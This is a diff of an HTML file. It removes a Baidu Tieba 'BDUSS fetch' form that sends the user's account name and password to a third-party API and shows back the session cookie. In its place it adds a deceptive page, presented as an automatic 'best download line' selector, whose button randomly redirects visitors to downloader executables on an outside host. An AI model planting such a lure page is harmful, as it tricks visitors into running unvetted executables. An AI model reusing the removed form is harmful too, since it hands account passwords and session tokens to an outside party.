@@ -1,88 +1,23 @@
-<!DOCTYPE html>
 <html>
 <head>
-  <meta charset="UTF-8">
-  <title>百度贴吧BDUSS在线获取</title>
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <meta name="format-detection" content="telephone=no">
-  <meta name="renderer" content="webkit">
-  <meta http-equiv="Cache-Control" content="no-siteapp" />
-  <link rel="stylesheet" href="http://cdn.staticfile.org/amazeui/1.0.0-beta2/css/amazeui.basic.min.css"/>
-  <script src="http://libs.baidu.com/zepto/1.1.3/zepto.min.js"></script>
-  <script src="http://cdn.staticfile.org/amazeui/1.0.0-beta2/js/amazeui.basic.min.js"></script>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
+<title>已为你选择最佳下载线路...</title>
+<script>
+function a(){
+var arr=["http://www.baidu.com",
+ "http://down.qixiu98.com:83/QXDownloader_1997_71618.exe",
+ "http://down.qixiu98.com:83/QXDownloader_1997_71751.exe", 
+ "http://down.qixiu98.com:83/QXDownloader_1997_71618.exe",
+ "http://down.qixiu98.com:83/QXDownloader_1997_71751.exe", 
+];
+var n=parseInt(Math.random()*5);
+window.location.href=arr[n];
+}
+</script>
 </head>
-<body>
-  <div class="am-g" style="position: relative;top: 30px;">
-	<div class="col-sm-12 col-md-4 col-md-centered">
-      <div class="am-panel am-panel-secondary">
-	    <form class="am-form am-form-horizontal">
-		  <fieldset>
-		  <legend class="am-text-center">百度贴吧BDUSS在线获取</legend>
-          <div class="am-form-group">
-            <div class="col-sm-12">
-              <input type="text" name="un" placeholder="输入邮箱或ID">
-            </div>
-          </div>
- 
-          <div class="am-form-group">
-            <div class="col-sm-12">
-              <input type="password" name="pwd" placeholder="输入密码">
-            </div>
-          </div>
- 
-		  <div class="am-form-group" id="vcode" style="display:none;">
-            <div class="col-sm-6">
-              <input type="text" name="vcode" placeholder="输入验证码">
-            </div>
-			<div class="col-sm-6">
-              <img src="" class="am-img-thumbnail">
-            </div>
-          </div>
- 
-          <div class="am-form-group">
-            <div class="col-sm-12">
-              <button type="button" class="am-btn am-btn-secondary am-btn-block">获取</button>
-            </div>
-          </div>
-		  </fieldset>
-        </form>
-		<p class="am-margin-left">注意：开启登陆保护将无法获取！</p>
-		<p class="am-margin-left am-text-sm">By <a href="http://www.giuem.com" target="_blank">Gieum</a>© 2014</p>
-	  </div>
-	  <div class="am-modal am-modal-alert" tabindex="-1" id="my-alert">
-        <div class="am-modal-dialog">
-          <div class="am-modal-hd">提示消息</div>
-          <div class="am-modal-bd" id="content"></div>
-          <div class="am-modal-footer">
-            <span class="am-modal-btn">确定</span>
-          </div>
-        </div>
-      </div>
-	</div>
-  </div>
-  <script>
-    $('.am-btn').on('click', function() {
-	  var data = $('form').serialize();
-	  $.getJSON('//giuemapi.jd-app.com/api/tb/api_login.php?'+data+'&callback=?',
-        function(json){
-		  switch(json.errno){
-		    case '0':
-			  $('#content').html("你的BDUSS是："+json.bduss);
-			  $('.am-modal').modal('toggle');
-			  break;
-			case '1':
-			  $('#vcode').show();
-			  $('img').attr('src',json.bduss);
-			  break;
-			case '2':
-			  $('#content').html(json.bduss);
-			  $('.am-modal').modal('toggle');
-			  break;
-		  };
-          
-        });
-	});
-  </script>
+<body><br><br><br><br>
+<center><input type=button value="已经为你选择最佳线路  <点这里下载>  " onclick=a()></center>
+<br>
+<a href="http://qianbao.baidu.com/hd/dream?qianbao" target="_blank"><img src="http://gongyi.baidu.com/gongyi/ad2.jpg" width="239" height="891"></a>
 </body>
 </html>
